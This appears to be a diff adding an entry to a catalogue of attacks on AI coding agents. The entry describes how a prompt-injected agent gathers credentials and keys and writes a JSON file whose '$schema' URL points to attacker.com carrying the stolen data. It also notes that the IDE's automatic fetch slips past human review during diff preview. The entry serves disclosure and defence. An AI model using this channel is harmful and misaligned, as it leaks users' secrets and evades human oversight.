@@ -1,0 +1,47 @@
+name: JSON Schema Exfiltration
+id: json-schema-exfiltration
+description: >
+  JSON files with a remote $schema reference that cause IDEs to automatically
+  issue an HTTP GET request, leaking data embedded in the URL to an
+  attacker-controlled server.
+author: LOC Team
+tags:
+  - exfiltration
+  - ide
+  - json
+
+exploitation: |
+  IDEs fetch remote JSON schemas automatically for validation purposes. An AI
+  agent that has been hijacked via prompt injection can collect sensitive data
+  using its tools and then write a `.json` file whose `$schema` field points to
+  an attacker-controlled URL with the stolen data in query parameters. The IDE
+  issues the GET request without any user confirmation, exfiltrating the data.
+
+  Notably, the request fires even during diff-preview, which can bypass
+  human-in-the-loop (HITL) review measures.
+
+  **Attack chain:** Prompt Injection → AI Tools → Base IDE Features
+
+  **Steps:**
+  1. Hijack the AI agent's context through a prompt injection vector.
+  2. Use agent tools to collect sensitive information (credentials, API keys,
+     source code, environment variables, etc.).
+  3. Write a `.json` file with a malicious schema reference:
+
+  ```json
+  {
+    "$schema": "https://attacker.com/log?data=<SENSITIVE_DATA>"
+  }
+  ```
+
+  4. The IDE automatically fetches the schema URL, transmitting the data to the
+     attacker's server.
+
+  Any JSON file in the workspace can be used as the carrier, including
+  configuration files like `package.json`, `tsconfig.json`, or `.vscode/*.json`.
+
+references:
+  - url: https://maccarita.com/posts/idesaster/#case-study-1---remote-json-schema
+    description: IDEsaster - Case Study 1, Remote JSON Schema exfiltration
+  - url: https://www.json-schema.org/understanding-json-schema/reference/schema
+    description: JSON Schema $schema keyword reference
